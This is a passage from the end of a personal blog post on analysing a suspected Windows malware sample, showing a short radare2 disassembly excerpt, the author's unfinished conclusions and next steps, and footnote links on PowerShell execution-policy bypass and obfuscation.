</span></span><span class=line><span class=cl>     ‚îå‚îÄ‚îÄ‚îÄ‚îÄ&lt; 0x00002f82      642e657865     js 0x2fec
</span></span><span class=line><span class=cl>     ‚îÇ‚îÇ‚îÇ‚îÇ   0x00002f87      0000           add byte [rax], al
</span></span><span class=line><span class=cl>     ‚îÇ‚îÇ‚îÇ‚îÇ   ; CODE XREFS from fcn.00000000 @ +0x2f15, +0x2f34
</span></span><span class=line><span class=cl>     ‚îÇ‚îÇ‚îÇ‚îÇ   0x00002f89      4553           push r11
</span></span><span class=line><span class=cl>     ‚îÇ‚îÇ‚îÇ‚îÇ   0x00002f8b      006500         add byte [rbp], ah
</span></span><span class=line><span class=cl>     ‚îÇ‚îÇ‚îÇ‚îÇ   0x00002f8e      6c             insb byte [rdi], dx
</span></span><span class=line><span class=cl>     ‚îÇ‚îÇ‚îÇ‚îÇ   0x00002f8f      006500         add byte [rbp], ah
</span></span><span class=line><span class=cl>     ‚îÇ‚îÇ‚îÇ‚îÇ   0x00002f92      6300           movsxd rax, dword [rax]
</span></span><span class=line><span class=cl>    ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ&lt; 0x00002f94      7400           je 0x2f96
</span></span><span class=line><span class=cl>    ‚îÇ‚îÇ‚îÇ‚îÇ‚îÇ   ; CODE XREF from fcn.00000000 @ +0x2f94
</span></span><span class=line><span class=cl>    ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ&gt; 0x00002f96      2000           and byte [rax], al
</span></span></code></pre></div><p>Then I looked at the color patterns to figure out if it had repeated patterns&mldr; I could then take it as a sign that this binary is itself encoded.</p><p><img loading=lazy src=https://i.imgur.com/HUXPKyI.png#center alt></p><h3 id=next-steps>Next Steps?<a hidden class=anchor aria-hidden=true href=#next-steps>#</a></h3><p>There are numerous indicators right now that point to the possibility that this is malware, but who am I to judge? (<em>based on what I currently understand about Windows malware analysis</em>)</p><p>For now, I just have a few leads to pursue, but maybe in the future I&rsquo;ll figure it all the way down and find out exactly what this program does. Till then&mldr;</p><p><img loading=lazy src=https://media.giphy.com/media/j4ksLmVDR4e6DbSQxU/giphy.gif#center alt></p><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p><a href=https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/>https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/</a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:2><p><a href=https://www.offensive-security.com/offsec/powershell-obfuscation/>https://www.offensive-security.com/offsec/powershell-obfuscation/</a>&#160;<a href=#fnref:2 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:3><p><a href=https://rada.re/n/radare2.html>https://rada.re/n/radare2.html</a>&#160;<a href=#fnref:3 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://ayedaemon.github.io/tags/powershell/>powershell</a></li><li><a href=https://ayedaemon.github.io/tags/malware/>malware</a></li><li><a href=https://ayedaemon.github.io/tags/obfuscation/>obfuscation</a></li></ul><nav class=paginav><a class=prev href=https://ayedaemon.github.io/post/2022/09/eudyptula-task-6/><span class=title>¬´ Next</span><br><span>Eudyptula Task 6</span>
</a><a class=next href=https://ayedaemon.github.io/post/2022/06/eudyptula-task-5/><span class=title>Prev ¬ª</span><br><span>Eudyptula Task5</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://ayedaemon.github.io/>Connected</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>